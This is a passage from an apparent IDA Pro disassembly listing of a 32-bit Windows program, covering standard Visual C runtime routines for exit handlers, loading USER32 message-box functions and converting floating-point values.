		push	eax
		sub	esp, 2Ch
		fstp	tbyte ptr [esp]
		fstp	tbyte ptr [esp+0Ch]
		call	unknown_libname_1 ; Microsoft VisualC 2-11/net runtime
		add	esp, 2Ch
		pop	eax
		retn
; [00000015 BYTES: COLLAPSED FUNCTION unknown_libname_14. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000206 BYTES: COLLAPSED FUNCTION unknown_libname_15. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000B2 BYTES: COLLAPSED FUNCTION unknown_libname_16. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000206 BYTES: COLLAPSED FUNCTION unknown_libname_17. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000B5 BYTES: COLLAPSED FUNCTION unknown_libname_18. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; ---------------------------------------------------------------------------

unknown_libname_19:			; Microsoft VisualC 2-11/net runtime
		call	unknown_libname_16
		retn
; ---------------------------------------------------------------------------

unknown_libname_20:			; Microsoft VisualC 2-11/net runtime
		call	unknown_libname_18
		retn
; ---------------------------------------------------------------------------

unknown_libname_21:			; Microsoft VisualC 2-11/net runtime
		fpatan
		retn
; ---------------------------------------------------------------------------

unknown_libname_22:			; Microsoft VisualC 2-11/net runtime
		fptan
		retn
; [0000013F BYTES: COLLAPSED FUNCTION __87except. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000014 BYTES: COLLAPSED FUNCTION __frnd. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000094 BYTES: COLLAPSED FUNCTION __fpclass. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __set_exp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000060 BYTES: COLLAPSED FUNCTION __sptype.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __decomp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000039 BYTES: COLLAPSED FUNCTION terminate(void). PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __initp_eh_hooks.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000BA BYTES: COLLAPSED FUNCTION __onexit_nolock. PRESS KEYPAD CTRL-"+" TO	EXPAND]
___onexitinit	db 8Bh,	0FFh		; DATA XREF: .rdata:0042440Co
; ---------------------------------------------------------------------------
		push	esi
		push	4
		push	20h
		call	__calloc_crt
		mov	esi, eax
		push	esi
		call	__encode_pointer
		add	esp, 0Ch
		mov	dword_44F0A8, eax
		mov	dword_44F0A4, eax
		test	esi, esi
		jnz	short loc_41E855
		push	18h
		pop	eax
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_41E855:				; CODE XREF: .text:0041E84Ej
		and	dword ptr [esi], 0
		xor	eax, eax
		pop	esi
		retn
; [0000003C BYTES: COLLAPSED FUNCTION __onexit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION _atexit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000001E BYTES: COLLAPSED FUNCTION __initp_misc_winsig. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000037 BYTES: COLLAPSED FUNCTION _siglookup. PRESS	KEYPAD CTRL-"+"	TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_41E904	proc near		; CODE XREF: _abort:loc_422227p
		push	dword_44EB74
		call	__decode_pointer
		pop	ecx
		retn
sub_41E904	endp

; [000001AA BYTES: COLLAPSED FUNCTION _raise. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED CHUNK OF FUNCTION _raise. PRESS KEYPAD CTRL-"+" TO	EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41EAC1	proc near		; CODE XREF: __init_pointers+23p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	dword_44EB80, eax
		pop	ebp
		retn
sub_41EAC1	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41EAD0	proc near		; CODE XREF: __init_pointers+1Dp

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	dword_44EB8C, eax
		pop	ebp
		retn
sub_41EAD0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41EADF	proc near		; CODE XREF: __NMSG_WRITE+16Ap

lpProcName	= dword	ptr -24h
var_14		= byte ptr -14h
var_C		= byte ptr -0Ch
var_8		= byte ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	esi
		push	edi
		call	__encoded_null
		and	[ebp+var_4], 0
		cmp	dword_44EB90, 0
		mov	ebx, eax
		jnz	loc_41EB90
		push	offset LibFileName ; "USER32.DLL"
		call	ds:LoadLibraryA
		mov	edi, eax
		test	edi, edi
		jz	loc_41EC41
		mov	esi, ds:GetProcAddress
		push	offset aMessageboxa ; "MessageBoxA"
		push	edi		; hModule
		call	esi ; GetProcAddress
		test	eax, eax
		jz	loc_41EC41
		push	eax
		call	__encode_pointer
		mov	[esp+24h+lpProcName], offset aGetactivewindo ; "GetActiveWindow"
		push	edi		; hModule
		mov	dword_44EB90, eax
		call	esi ; GetProcAddress
		push	eax
		call	__encode_pointer
		mov	[esp+24h+lpProcName], offset aGetlastactivep ; "GetLastActivePopup"
		push	edi		; hModule
		mov	dword_44EB94, eax
		call	esi ; GetProcAddress
		push	eax
		call	__encode_pointer
		mov	[esp+24h+lpProcName], offset aGetuserobjecti ; "GetUserObjectInformationA"
		push	edi		; hModule
		mov	dword_44EB98, eax
		call	esi ; GetProcAddress
		push	eax
		call	__encode_pointer
		pop	ecx
		mov	dword_44EBA0, eax
		test	eax, eax
		jz	short loc_41EB90
		push	offset aGetprocesswind ; "GetProcessWindowStation"
		push	edi		; hModule
		call	esi ; GetProcAddress
		push	eax
		call	__encode_pointer
		pop	ecx
		mov	dword_44EB9C, eax

loc_41EB90:				; CODE XREF: sub_41EADF+1Dj
					; sub_41EADF+9Bj
		mov	eax, dword_44EB9C
		cmp	eax, ebx
		jz	short loc_41EBE8
		cmp	dword_44EBA0, ebx
		jz	short loc_41EBE8
		push	eax
		call	__decode_pointer
		push	dword_44EBA0
		mov	esi, eax
		call	__decode_pointer
		pop	ecx
		pop	ecx
		mov	edi, eax
		test	esi, esi
		jz	short loc_41EBE8
		test	edi, edi
		jz	short loc_41EBE8
		call	esi
		test	eax, eax
		jz	short loc_41EBDF
		lea	ecx, [ebp+var_8]
		push	ecx
		push	0Ch
		lea	ecx, [ebp+var_14]
		push	ecx
		push	1
		push	eax
		call	edi
		test	eax, eax
		jz	short loc_41EBDF
		test	[ebp+var_C], 1
		jnz	short loc_41EBE8

loc_41EBDF:				; CODE XREF: sub_41EADF+E5j
					; sub_41EADF+F8j
		or	[ebp+arg_8], 200000h
		jmp	short loc_41EC21
; ---------------------------------------------------------------------------

loc_41EBE8:				; CODE XREF: sub_41EADF+B8j
					; sub_41EADF+C0j ...
		mov	eax, dword_44EB94
		cmp	eax, ebx
		jz	short loc_41EC21
		push	eax
		call	__decode_pointer
		pop	ecx
		test	eax, eax
		jz	short loc_41EC21
		call	eax
		mov	[ebp+var_4], eax
		test	eax, eax
		jz	short loc_41EC21
		mov	eax, dword_44EB98
		cmp	eax, ebx
		jz	short loc_41EC21
		push	eax
		call	__decode_pointer
		pop	ecx
		test	eax, eax
		jz	short loc_41EC21
		push	[ebp+var_4]
		call	eax
		mov	[ebp+var_4], eax

loc_41EC21:				; CODE XREF: sub_41EADF+107j
					; sub_41EADF+110j ...
		push	dword_44EB90
		call	__decode_pointer
		pop	ecx
		test	eax, eax
		jz	short loc_41EC41
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	[ebp+var_4]
		call	eax
		jmp	short loc_41EC43
; ---------------------------------------------------------------------------

loc_41EC41:				; CODE XREF: sub_41EADF+32j
					; sub_41EADF+48j ...
		xor	eax, eax

loc_41EC43:				; CODE XREF: sub_41EADF+160j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_41EADF	endp

; [00000074 BYTES: COLLAPSED FUNCTION _strcat_s. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000B5 BYTES: COLLAPSED FUNCTION _strncpy_s. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000004B BYTES: COLLAPSED FUNCTION __set_error_mode.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000053 BYTES: COLLAPSED FUNCTION x_ismbbtype_l(localeinfo_struct *,uint,int,int). PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000020 BYTES: COLLAPSED FUNCTION __freea. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [000003A5 BYTES: COLLAPSED FUNCTION __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const	*,int,char *,int,int,int). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000045 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000001BA BYTES: COLLAPSED FUNCTION __crtGetStringTypeA_stat(localeinfo_struct *,ulong,char const *,int,ushort *,int,int,int). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000042 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000195 BYTES: COLLAPSED FUNCTION ___free_lc_time. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000045 BYTES: COLLAPSED FUNCTION ___free_lconv_num. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000008E BYTES: COLLAPSED FUNCTION ___free_lconv_mon. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000046 BYTES: COLLAPSED FUNCTION _strcspn.	PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000088 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000040 BYTES: COLLAPSED FUNCTION _strpbrk.	PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_41F7C0	proc near		; CODE XREF: __invoke_watson+103p
					; __invalid_parameter+1Ap ...
		and	dword_44EF90, 0
		retn
sub_41F7C0	endp

; [000000B8 BYTES: COLLAPSED FUNCTION __isctype_l. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000038 BYTES: COLLAPSED FUNCTION __isleadbyte_l. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41F8B8	proc near		; CODE XREF: sub_41C3D2+46p

var_2C		= byte ptr -2Ch
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	eax, [ebp+arg_0]
		movzx	ecx, word ptr [eax+0Ah]
		push	ebx
		mov	ebx, ecx
		and	ecx, 8000h
		mov	[ebp+var_14], ecx
		mov	ecx, [eax+6]
		mov	[ebp+var_20], ecx
		mov	ecx, [eax+2]
		movzx	eax, word ptr [eax]
		and	ebx, 7FFFh
		sub	ebx, 3FFFh
		shl	eax, 10h
		push	edi
		mov	[ebp+var_1C], ecx
		mov	[ebp+var_18], eax
		cmp	ebx, 0FFFFC001h
		jnz	short loc_41F924
		xor	ebx, ebx
		xor	eax, eax

loc_41F901:				; CODE XREF: sub_41F8B8+53j
		cmp	[ebp+eax*4+var_20], ebx
		jnz	short loc_41F914
		inc	eax
		cmp	eax, 3
		jl	short loc_41F901
		xor	eax, eax
		jmp	loc_41FDB9
; ---------------------------------------------------------------------------

loc_41F914:				; CODE XREF: sub_41F8B8+4Dj
		xor	eax, eax
		lea	edi, [ebp+var_20]
		stosd
		stosd
		push	2
		stosd
		pop	eax
		jmp	loc_41FDB9
; ---------------------------------------------------------------------------

loc_41F924:				; CODE XREF: sub_41F8B8+43j
		and	[ebp+arg_0], 0
		push	esi
		lea	esi, [ebp+var_20]
		lea	edi, [ebp+var_2C]
		movsd
		movsd
		movsd
		mov	esi, dword_430C68
		dec	esi
		lea	ecx, [esi+1]
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		sar	eax, 5
		mov	edx, ecx
		and	edx, 8000001Fh
		mov	[ebp+var_10], ebx
		mov	[ebp+var_C], eax
		jns	short loc_41F95C
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41F95C:				; CODE XREF: sub_41F8B8+9Dj
		lea	edi, [ebp+eax*4+var_20]
		push	1Fh
		xor	eax, eax
		pop	ecx
		sub	ecx, edx
		inc	eax
		shl	eax, cl
		mov	[ebp+var_8], ecx
		test	[edi], eax
		jz	loc_41FA02
		mov	eax, [ebp+var_C]
		or	edx, 0FFFFFFFFh
		shl	edx, cl
		not	edx
		test	[ebp+eax*4+var_20], edx
		jmp	short loc_41F98A
; ---------------------------------------------------------------------------

loc_41F985:				; CODE XREF: sub_41F8B8+D8j
		cmp	[ebp+eax*4+var_20], 0

loc_41F98A:				; CODE XREF: sub_41F8B8+CBj
		jnz	short loc_41F994
		inc	eax
		cmp	eax, 3
		jl	short loc_41F985
		jmp	short loc_41FA02
; ---------------------------------------------------------------------------

loc_41F994:				; CODE XREF: sub_41F8B8:loc_41F98Aj
		mov	eax, esi
		cdq
		push	1Fh
		pop	ecx
		and	edx, ecx
		add	eax, edx
		sar	eax, 5
		and	esi, 8000001Fh
		jns	short loc_41F9AE
		dec	esi
		or	esi, 0FFFFFFE0h
		inc	esi

loc_41F9AE:				; CODE XREF: sub_41F8B8+EFj
		and	[ebp+var_4], 0
		sub	ecx, esi
		xor	edx, edx
		inc	edx
		shl	edx, cl
		lea	ecx, [ebp+eax*4+var_20]
		mov	esi, [ecx]
		add	esi, edx
		mov	[ebp+arg_0], esi
		mov	esi, [ecx]
		cmp	[ebp+arg_0], esi
		jb	short loc_41F9ED
		cmp	[ebp+arg_0], edx
		jmp	short loc_41F9EB
; ---------------------------------------------------------------------------

loc_41F9D0:				; CODE XREF: sub_41F8B8+145j
		test	ecx, ecx
		jz	short loc_41F9FF
		and	[ebp+var_4], 0
		lea	ecx, [ebp+eax*4+var_20]
		mov	edx, [ecx]
		lea	esi, [edx+1]
		mov	[ebp+arg_0], esi
		cmp	esi, edx
		jb	short loc_41F9ED
		cmp	esi, 1

loc_41F9EB:				; CODE XREF: sub_41F8B8+116j
		jnb	short loc_41F9F4

loc_41F9ED:				; CODE XREF: sub_41F8B8+111j
					; sub_41F8B8+12Ej
		mov	[ebp+var_4], 1

loc_41F9F4:				; CODE XREF: sub_41F8B8:loc_41F9EBj
		dec	eax
		mov	edx, [ebp+arg_0]
		mov	[ecx], edx
		mov	ecx, [ebp+var_4]
		jns	short loc_41F9D0

loc_41F9FF:				; CODE XREF: sub_41F8B8+11Aj
		mov	[ebp+arg_0], ecx

loc_41FA02:				; CODE XREF: sub_41F8B8+B7j
					; sub_41F8B8+DAj
		mov	ecx, [ebp+var_8]
		or	eax, 0FFFFFFFFh
		shl	eax, cl
		and	[edi], eax
		mov	eax, [ebp+var_C]
		inc	eax
		cmp	eax, 3
		jge	short loc_41FA22
		push	3
		pop	ecx
		lea	edi, [ebp+eax*4+var_20]
		sub	ecx, eax
		xor	eax, eax
		rep stosd

loc_41FA22:				; CODE XREF: sub_41F8B8+15Bj
		cmp	[ebp+arg_0], 0
		jz	short loc_41FA29
		inc	ebx

loc_41FA29:				; CODE XREF: sub_41F8B8+16Ej
		mov	eax, dword_430C64
		mov	ecx, eax
		sub	ecx, dword_430C68
		cmp	ebx, ecx
		jge	short loc_41FA47
		xor	eax, eax
		lea	edi, [ebp+var_20]
		stosd
		stosd
		stosd
		jmp	loc_41FC54
; ---------------------------------------------------------------------------

loc_41FA47:				; CODE XREF: sub_41F8B8+180j
		cmp	ebx, eax
		jg	loc_41FC5E
		sub	eax, [ebp+var_10]
		lea	esi, [ebp+var_2C]
		mov	ecx, eax
		lea	edi, [ebp+var_20]
		movsd
		cdq
		and	edx, 1Fh
		add	eax, edx
		movsd
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		movsd
		jns	short loc_41FA75
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FA75:				; CODE XREF: sub_41F8B8+1B6j
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	edi, 0FFFFFFFFh
		mov	ecx, edx
		shl	edi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	edi

loc_41FA90:				; CODE XREF: sub_41F8B8+203j
		mov	ebx, [ebp+arg_0]
		lea	ebx, [ebp+ebx*4+var_20]
		mov	esi, [ebx]
		mov	ecx, esi
		and	ecx, edi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	esi, cl
		mov	ecx, [ebp+var_4]
		or	esi, [ebp+var_C]
		mov	[ebx], esi
		mov	esi, [ebp+var_10]
		shl	esi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], esi
		jl	short loc_41FA90
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_41FACA:				; CODE XREF: sub_41F8B8+229j
		cmp	edx, eax
		jl	short loc_41FAD6
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_41FADB
; ---------------------------------------------------------------------------

loc_41FAD6:				; CODE XREF: sub_41F8B8+214j
		and	[ebp+edx*4+var_20], 0

loc_41FADB:				; CODE XREF: sub_41F8B8+21Cj
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_41FACA
		mov	esi, dword_430C68
		dec	esi
		lea	ecx, [esi+1]
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		sar	eax, 5
		mov	edx, ecx
		and	edx, 8000001Fh
		mov	[ebp+var_C], eax
		jns	short loc_41FB0A
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FB0A:				; CODE XREF: sub_41F8B8+24Bj
		push	1Fh
		pop	ecx
		sub	ecx, edx
		xor	edx, edx
		inc	edx
		shl	edx, cl
		lea	ebx, [ebp+eax*4+var_20]
		mov	[ebp+var_10], ecx
		test	[ebx], edx
		jz	loc_41FBA5
		or	edx, 0FFFFFFFFh
		shl	edx, cl
		not	edx
		test	[ebp+eax*4+var_20], edx
		jmp	short loc_41FB35
; ---------------------------------------------------------------------------

loc_41FB30:				; CODE XREF: sub_41F8B8+283j
		cmp	[ebp+eax*4+var_20], 0

loc_41FB35:				; CODE XREF: sub_41F8B8+276j
		jnz	short loc_41FB3F
		inc	eax
		cmp	eax, 3
		jl	short loc_41FB30
		jmp	short loc_41FBA5
; ---------------------------------------------------------------------------

loc_41FB3F:				; CODE XREF: sub_41F8B8:loc_41FB35j
		mov	eax, esi
		cdq
		push	1Fh
		pop	ecx
		and	edx, ecx
		add	eax, edx
		sar	eax, 5
		and	esi, 8000001Fh
		jns	short loc_41FB59
		dec	esi
		or	esi, 0FFFFFFE0h
		inc	esi

loc_41FB59:				; CODE XREF: sub_41F8B8+29Aj
		and	[ebp+arg_0], 0
		xor	edx, edx
		sub	ecx, esi
		inc	edx
		shl	edx, cl
		lea	ecx, [ebp+eax*4+var_20]
		mov	esi, [ecx]
		lea	edi, [esi+edx]
		cmp	edi, esi
		jb	short loc_41FB75
		cmp	edi, edx
		jnb	short loc_41FB7C

loc_41FB75:				; CODE XREF: sub_41F8B8+2B7j
		mov	[ebp+arg_0], 1

loc_41FB7C:				; CODE XREF: sub_41F8B8+2BBj
		mov	[ecx], edi
		mov	ecx, [ebp+arg_0]
		jmp	short loc_41FBA2
; ---------------------------------------------------------------------------

loc_41FB83:				; CODE XREF: sub_41F8B8+2EBj
		test	ecx, ecx
		jz	short loc_41FBA5
		lea	ecx, [ebp+eax*4+var_20]
		mov	edx, [ecx]
		lea	esi, [edx+1]
		xor	edi, edi
		cmp	esi, edx
		jb	short loc_41FB9B
		cmp	esi, 1
		jnb	short loc_41FB9E

loc_41FB9B:				; CODE XREF: sub_41F8B8+2DCj
		xor	edi, edi
		inc	edi

loc_41FB9E:				; CODE XREF: sub_41F8B8+2E1j
		mov	[ecx], esi
		mov	ecx, edi

loc_41FBA2:				; CODE XREF: sub_41F8B8+2C9j
		dec	eax
		jns	short loc_41FB83

loc_41FBA5:				; CODE XREF: sub_41F8B8+265j
					; sub_41F8B8+285j ...
		mov	ecx, [ebp+var_10]
		or	eax, 0FFFFFFFFh
		shl	eax, cl
		and	[ebx], eax
		mov	eax, [ebp+var_C]
		inc	eax
		cmp	eax, 3
		jge	short loc_41FBC5
		push	3
		pop	ecx
		lea	edi, [ebp+eax*4+var_20]
		sub	ecx, eax
		xor	eax, eax
		rep stosd

loc_41FBC5:				; CODE XREF: sub_41F8B8+2FEj
		mov	ecx, dword_430C6C
		inc	ecx
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		jns	short loc_41FBE6
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FBE6:				; CODE XREF: sub_41F8B8+327j
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	edi, 0FFFFFFFFh
		mov	ecx, edx
		shl	edi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	edi

loc_41FC01:				; CODE XREF: sub_41F8B8+374j
		mov	ebx, [ebp+arg_0]
		lea	ebx, [ebp+ebx*4+var_20]
		mov	esi, [ebx]
		mov	ecx, esi
		and	ecx, edi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	esi, cl
		mov	ecx, [ebp+var_4]
		or	esi, [ebp+var_C]
		mov	[ebx], esi
		mov	esi, [ebp+var_10]
		shl	esi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], esi
		jl	short loc_41FC01
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_41FC3B:				; CODE XREF: sub_41F8B8+39Aj
		cmp	edx, eax
		jl	short loc_41FC47
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_41FC4C
; ---------------------------------------------------------------------------

loc_41FC47:				; CODE XREF: sub_41F8B8+385j
		and	[ebp+edx*4+var_20], 0

loc_41FC4C:				; CODE XREF: sub_41F8B8+38Dj
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_41FC3B

loc_41FC54:				; CODE XREF: sub_41F8B8+18Aj
		push	2
		xor	ebx, ebx
		pop	eax
		jmp	loc_41FDB8
; ---------------------------------------------------------------------------

loc_41FC5E:				; CODE XREF: sub_41F8B8+191j
		cmp	ebx, dword_430C60
		mov	ecx, dword_430C6C
		jl	loc_41FD1D
		xor	eax, eax
		lea	edi, [ebp+var_20]
		stosd
		stosd
		stosd
		or	[ebp+var_20], 80000000h
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		jns	short loc_41FC99
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FC99:				; CODE XREF: sub_41F8B8+3DAj
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	edi, 0FFFFFFFFh
		mov	ecx, edx
		shl	edi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	edi

loc_41FCB4:				; CODE XREF: sub_41F8B8+427j
		mov	ebx, [ebp+arg_0]
		lea	ebx, [ebp+ebx*4+var_20]
		mov	esi, [ebx]
		mov	ecx, esi
		and	ecx, edi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	esi, cl
		mov	ecx, [ebp+var_4]
		or	esi, [ebp+var_C]
		mov	[ebx], esi
		mov	esi, [ebp+var_10]
		shl	esi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], esi
		jl	short loc_41FCB4
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_41FCEE:				; CODE XREF: sub_41F8B8+44Dj
		cmp	edx, eax
		jl	short loc_41FCFA
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_41FCFF
; ---------------------------------------------------------------------------

loc_41FCFA:				; CODE XREF: sub_41F8B8+438j
		and	[ebp+edx*4+var_20], 0

loc_41FCFF:				; CODE XREF: sub_41F8B8+440j
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_41FCEE
		mov	eax, dword_430C60
		mov	ecx, dword_430C74
		lea	ebx, [ecx+eax]
		xor	eax, eax
		inc	eax
		jmp	loc_41FDB8
; ---------------------------------------------------------------------------

loc_41FD1D:				; CODE XREF: sub_41F8B8+3B2j
		mov	eax, dword_430C74
		and	[ebp+var_20], 7FFFFFFFh
		add	ebx, eax
		mov	eax, ecx
		cdq
		and	edx, 1Fh
		add	eax, edx
		mov	edx, ecx
		sar	eax, 5
		and	edx, 8000001Fh
		jns	short loc_41FD45
		dec	edx
		or	edx, 0FFFFFFE0h
		inc	edx

loc_41FD45:				; CODE XREF: sub_41F8B8+486j
		and	[ebp+var_C], 0
		and	[ebp+arg_0], 0
		or	esi, 0FFFFFFFFh
		mov	ecx, edx
		shl	esi, cl
		mov	[ebp+var_4], 20h
		sub	[ebp+var_4], edx
		not	esi

loc_41FD60:				; CODE XREF: sub_41F8B8+4D6j
		mov	ecx, [ebp+arg_0]
		mov	edi, [ebp+ecx*4+var_20]
		mov	ecx, edi
		and	ecx, esi
		mov	[ebp+var_10], ecx
		mov	ecx, edx
		shr	edi, cl
		mov	ecx, [ebp+arg_0]
		or	edi, [ebp+var_C]
		mov	[ebp+ecx*4+var_20], edi
		mov	edi, [ebp+var_10]
		mov	ecx, [ebp+var_4]
		shl	edi, cl
		inc	[ebp+arg_0]
		cmp	[ebp+arg_0], 3
		mov	[ebp+var_C], edi
		jl	short loc_41FD60
		mov	esi, eax
		push	2
		shl	esi, 2
		lea	ecx, [ebp+var_18]
		pop	edx
		sub	ecx, esi

loc_41FD9D:				; CODE XREF: sub_41F8B8+4FCj
		cmp	edx, eax
		jl	short loc_41FDA9
		mov	esi, [ecx]
		mov	[ebp+edx*4+var_20], esi
		jmp	short loc_41FDAE
; ---------------------------------------------------------------------------

loc_41FDA9:				; CODE XREF: sub_41F8B8+4E7j
		and	[ebp+edx*4+var_20], 0

loc_41FDAE:				; CODE XREF: sub_41F8B8+4EFj
		dec	edx
		sub	ecx, 4
		test	edx, edx
		jge	short loc_41FD9D
		xor	eax, eax

loc_41FDB8:				; CODE XREF: sub_41F8B8+3A1j
					; sub_41F8B8+460j
		pop	esi

loc_41FDB9:				; CODE XREF: sub_41F8B8+57j
					; sub_41F8B8+67j
		push	1Fh
		pop	ecx
		sub	ecx, dword_430C6C
		shl	ebx, cl
		mov	ecx, [ebp+var_14]
		neg	ecx
		sbb	ecx, ecx
		and	ecx, 80000000h
		or	ebx, ecx
		mov	ecx, dword_430C70
		or	ebx, [ebp+var_20]
		cmp	ecx, 40h
		jnz	short loc_41FDEE
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+var_1C]
		mov	[ecx+4], ebx
		mov	[ecx], edx
		jmp	short loc_41FDF8
; ---------------------------------------------------------------------------

loc_41FDEE:				; CODE XREF: sub_41F8B8+527j
		cmp	ecx, 20h
		jnz	short loc_41FDF8
		mov	ecx, [ebp+arg_4]
		mov	[ecx], ebx

loc_41FDF8:				; CODE XREF: sub_41F8B8+534j
					; sub_41F8B8+539j
		pop	edi
		pop	ebx
		leave
		retn
sub_41F8B8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41FDFC	proc near		; CODE XREF: sub_41C47A+46p

var_2C		= byte ptr -2Ch
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	eax, [ebp+arg_0]
		movzx	ecx, word ptr [eax+0Ah]
		push	ebx
		mov	ebx, ecx
		and	ecx, 8000h
		mov	[ebp+var_14], ecx
		mov	ecx, [eax+6]
		mov	[ebp+var_20], ecx
		mov	ecx, [eax+2]
		movzx	eax, word ptr [eax]
		and	ebx, 7FFFh
		sub	ebx, 3FFFh
		shl	eax, 10h
		push	edi
		mov	[ebp+var_1C], ecx
		mov	[ebp+var_18], eax
		cmp	ebx, 0FFFFC001h
		jnz	short loc_41FE68
		xor	ebx, ebx
		xor	eax, eax

